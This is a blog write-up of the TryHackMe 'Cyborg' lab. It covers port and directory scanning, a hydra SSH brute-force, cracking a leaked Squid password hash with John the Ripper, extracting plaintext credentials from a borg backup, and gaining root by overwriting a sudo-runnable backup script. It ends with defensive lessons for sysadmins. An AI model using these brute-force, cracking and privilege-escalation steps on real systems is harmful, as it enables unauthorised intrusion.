---
title: "Challenges: Cyborg (TryHackMe)"
datePublished: Sun Jul 20 2025 17:35:33 GMT+0000 (Coordinated Universal Time)
cuid: cmdbyjo93000202js566i9gek
slug: challenges-cyborg-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1753032838112/aa2cb52a-b6e4-4748-8487-b01fabc84cd2.png
tags: backup, nmap, tryhackme, john-the-ripper, ctf-writeup, borg

---

In this challenge, we take on the role of an attacker performing a full compromise of a Linux system — from external enumeration to post-exploitation. The machine gives us insight into common misconfigurations that lead to system compromise. It also gives us a strong reminder: **even seemingly harmless files like music archives or backup scripts can open up dangerous privilege escalation paths**.

While this may be a CTF scenario, the steps taken here closely mirror real-world enumeration and post-exploitation tactics. Developers, sysadmins, and DevSecOps teams can learn valuable lessons by studying how these missteps allowed an attacker to gain both user and root access.

## Deploy the machine

Please deploy the machine so you can get started. Please allow a few minutes to make sure all the services boot up. Good luck!

twitter: fieldraccoon

## Compromise the System

Compromise the machine and read the user.txt and root.txt

### Answer the questions below

1. Scan the machine, how many ports are open?
    
    `nmap -sV IP_Address`
    
    this will answer the following questions on services running on port 22 and 80
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752956937770/1b9e33f7-f277-40a4-b7bf-9fd7f59b2a15.png align="center")
    
2. What service is running on port 22?
    
3. What service is running on port 80?
    
4. What is the user.txt flag?
    
    further enumeration:
    
    `gobuster dir -u ip_address -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752957088129/a1f91387-e875-41f5-b793-319f520031b6.png align="center")
    
    `gobuster dir -u http://ip_address -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752957158334/15daa602-7dee-4e0c-a418-cb7a5006da7c.png align="center")
    
    ```bash
    Admin Shoutbox
    
                
                    ############################################
                    ############################################
                    [Yesterday at 4.32pm from Josh]
                    Are we all going to watch the football game at the weekend??
                    ############################################
                    ############################################
                    [Yesterday at 4.33pm from Adam]
                    Yeah Yeah mate absolutely hope they win!
                    ############################################
                    ############################################
                    [Yesterday at 4.35pm from Josh]
                    See you there then mate!
                    ############################################
                    ############################################
                    [Today at 5.45am from Alex]
                    Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                    I decided to give up like i always do ahahaha sorry about that.
                    I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                    Might pass it over to the IT guys but in the meantime all the config files are laying about.
                    And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                    other than that im pretty sure my backup "music_archive" is safe just to confirm.
                    ############################################
                    ############################################
    ```
    
    on the site there’s a hint of three users, Alex, Josh and Adam.  
      
    Folder → music\_archive (take note)  
      
    Tried using hydra and ssh to find password of user Alex  
      
    `hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://<IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753028625038/66eff2bb-073b-4c80-bf0d-bf3f98180b01.png align="center")
    
    Checked my-studio - Alex’s studio
    
    * checking: `/etc/squid/squid.config` there a hint on `/etc/squid/passwd`
        
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753029142596/95f7270b-9e07-485f-bb82-750f63f3aa14.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753029397836/30c645b3-a703-4a8b-a092-2908aa96917d.png align="center")
    
    ```bash
    music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
    ```
    
      
    we’ll copy it to hash.txt file then use [John the Ripper](https://www.kali.org/tools/john/)  
      
    `john —wordlist=/usr/share/wordlists/rockyou.txt hash.txt`  
      
    this revealed a passphrase
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753029549692/e6b1f1a7-a2dc-488e-b5a0-aff86747bec7.png align="center")
    
    Have you thought about where the config might be?
    
    `tar xf backup.tar`  
    
    `cd /root/home/field/dev`  
    
    `borg list final_archive`  
    
    passphrase: `squidward`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753029802155/da512abc-5ce8-47b0-84c2-7a2c9fb1b9b4.png align="center")
    
    `borg list final_archive:music_archive`  
    
    passphrase: `squidphrase`  
    
    Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
    
    alex:S3cretP@s3  
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753030856352/2fa132b6-0f5f-4e10-b24d-f32d8c4760fb.png align="center")
    
    use SSH and the given credentials then go ahead and find the user flag:  
      
    `find / -type f -name user.txt 2> /dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753031402055/12615c0f-75f7-42e0-aed5-57b609391531.png align="center")
    
5. What is the root.txt flag?  
      
    let’s find a way to escalate the privileges to find the root flag:  
      
    `sudo -l`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753031650710/ebd7c803-b0e5-45aa-9a54-0bac0145e09c.png align="center")
    
    checking the backup.sh and granting it, write permissions:  
      
    `chmod +w backup.sh`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753031586420/9bf8a553-78e7-45e9-9c6d-440e040cfbfb.png align="center")
    
    ```bash
    #!/bin/bash
    
    sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
    
    input="/etc/mp3backups/backed_up_files.txt"
    #while IFS= read -r line
    #do
    #a="/etc/mp3backups/backed_up_files.txt"
    
    # b=$(basename $input)
    
    #echo
    
    # echo "$line"
    
    #done < "$input"
    
    while getopts c: flag
    do
    case "${flag}" in
    c) command=${OPTARG};;
    esac
    done
    
    backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"
    
    # Where to backup to.
    
    dest="/etc/mp3backups/"
    
    # Create archive filename.
    
    hostname=$(hostname -s)
    archive_file="$hostname-scheduled.tgz"
    
    # Print start status message.
    
    echo "Backing up $backup_files to $dest/$archive_file"
    
    echo
    
    # Backup the files using tar.
    
    tar czf $dest/$archive_file $backup_files
    
    # Print end status message.
    
    echo
    echo "Backup finished"
    
    cmd=$($command)
    echo $cmd
    ```
    
    `echo /bin/bash > /etc/mp3backups/backup.sh`  
      
    `sudo /etc/mp3backups/backup.sh`  
      
    `find / -type f -name root.txt 2> /dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753031836398/3963d880-e975-4822-b7f8-fd0eeb683733.png align="center")
    
    ## 🔐 Lessons for Developers & Sysadmins
    
    ### 🔸 1. Don’t hardcode passwords in backups or scripts
    
    * Borg archive revealed plaintext credentials.
        
    * Store secrets in secure vaults (e.g., HashiCorp Vault, AWS Secrets Manager).
        
    
    ### 🔸 2. Avoid write permissions on scripts with elevated privileges
    
    * Writable [`backup.sh`](http://backup.sh) + sudo access = root shell.
        
    * Use `chown root:root && chmod 700` for sensitive scripts.
        
    
    ### 🔸 3. Secure archival tools like `borg`
    
    * Use encrypted repositories.
        
    * Limit who can access or restore archives.
        
    
    ### 🔸 4. Monitor and remove debug/test credentials
    
    * `alex:S3cretP@s3` might have been for testing.
        
    * Test accounts should never exist on production.
        
    
    ### 🔸 5. Practice Least Privilege Always
    
    * `alex` could run a root script — that's unnecessary access.
        
    * Audit sudo rights regularly.
        
    
    ### 🔸 6. Watch for exposed configuration files
    
    * Squid config and password files were publicly accessible.
        
    * Use `.gitignore`, `.htaccess`, and proper server-side validation.  
          
        
    
    ## Conclusion
    
    This machine reinforces the importance of security best practices for developers and system administrators alike. Every minor mistake — from poor password storage to improperly secured scripts — opens up a pathway for attackers.
    
    This challenge teaches the value of:
    
    * **Proper file permissions**
        
    * **Credential management**
        
    * **Secure backup handling**
        
    * **Least privilege principle**
        
    
    Even without any exploits, **misconfiguration alone** led to full system compromise.